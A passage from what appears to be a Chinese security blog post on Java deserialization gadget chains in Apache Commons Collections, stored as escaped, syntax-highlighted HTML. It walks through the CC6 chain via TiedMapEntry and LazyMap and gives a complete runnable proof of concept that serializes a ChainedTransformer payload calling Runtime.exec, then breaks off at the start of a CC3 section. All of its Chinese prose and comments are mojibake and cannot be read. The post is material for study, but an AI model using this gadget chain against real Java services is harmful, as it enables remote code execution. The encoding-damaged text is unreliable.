&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">TiedMapEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">map&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">getKey&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">getValue&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ...
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">hashCode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getKey&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#111">0&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getKey&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">hashCode&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">^&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#111">0&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hashCode&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// ..
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åœ¨å®ƒçš„&lt;code>getValue&lt;/code>ä¸­è°ƒç”¨äº†&lt;code>this.map.get&lt;/code>ï¼Œè€ŒhashCodeæ–¹æ³•è°ƒç”¨äº†getValueï¼ˆHashMapçš„å®žçŽ°åŽŸç†ï¼‰ï¼Œåœ¨ysoserialä¸­æ˜¯åˆ©ç”¨&lt;code>java.util.HashSet#readObject&lt;/code>åˆ°&lt;code>HashMap#put()&lt;/code>åˆ°&lt;code>HashMap#hash(key)&lt;/code>æœ€åŽåˆ°&lt;code>TiedMapEntry#hashCode()&lt;/code>&lt;/p>
&lt;p>åœ¨pç‰›çš„ç®€åŒ–pocä¸­çœç•¥äº†å‰ä¸¤æ­¥ï¼Œé€šè¿‡&lt;code>HashMap#readObject&lt;/code>ç›´æŽ¥åˆ°&lt;code>HashMap#hash(key)&lt;/code>ï¼Œhashä¸­è°ƒç”¨äº†&lt;code>key.hashCode&lt;/code>ï¼ˆçº¯HashMapçš„å®žçŽ°åŽŸç†&lt;/p>
&lt;p>æž„é€ pocï¼Œæˆ‘ä»¬åªéœ€è¦è®©è¿™ä¸ªkeyç­‰äºŽTiedMapEntryå¯¹è±¡ï¼Œå†æ”¹åŠ¨äº¿ç‚¹ç‚¹&lt;/p>
&lt;p>é¦–å…ˆæ˜¯æ¶æ„LazyMap&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.LazyMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC6&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fakeTransformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)};&lt;/span> &lt;span style="color:#75715e">// é¿å…ç”Ÿæˆpayloadæ—¶è§¦å‘RCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getMethod&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fakeTransformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// å¾—åˆ°è¢«è£…é¥°åŽçš„æ¶æ„LazyMapå¯¹è±¡
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TiedMapEntry&lt;/span> &lt;span style="color:#111">tme&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TiedMapEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;keykey&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">expMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// ä¸ºäº†è°ƒç”¨TiedMapEntry#hashCode æ–°å»ºHashMap å¹¶æŠŠtmeä½œä¸ºkey
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">tme&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;valuevalue&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">remove&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;keykey&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// putä¹Ÿä¼šè°ƒç”¨hash(key) é¿å…å¯¹åŽé¢getçš„å½±å“
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;iTransformers&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// æ›¿æ¢çœŸæ­£çš„transformers
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// åºåˆ—åŒ–éƒ¨åˆ†
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è§¦å‘
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>é€»è¾‘æ˜¯æ¯”è¾ƒæ¸…æ™°çš„ï¼Œæ¯ä¸€éƒ¨åˆ†ä¹Ÿéƒ½æ¯”è¾ƒå¥½æ‡‚&lt;/p>
&lt;h2 id="cc38u71">CC3(&amp;lt;8u71&lt;/h2>
&lt;p>ç”±äºŽ&lt;code>TemplatesImpl&lt;/code>å¯ä»¥ç›´æŽ¥æŽ§åˆ¶å­—èŠ‚ç ï¼ˆå³javaä»£ç ï¼‰ï¼Œæ‰€ä»¥å°è¯•ç»“åˆCC1 demoå’Œæ‰§è¡Œå­—èŠ‚ç çš„éƒ¨åˆ†å°±å¯ä»¥æž„é€ å‡ºCC3ï¼ˆçš„ä¸€éƒ¨åˆ†ï¼‰äº†ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¦å°†&lt;code>InvokerTransformer&lt;/code>æ‰§è¡Œçš„æ–¹æ³•ä»Žæ˜¾å¼çš„rceï¼ˆgetRuntime.execï¼‰å˜ä¸ºè°ƒç”¨&lt;code>TemplatesImpl::newTransformer&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.TransformedMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
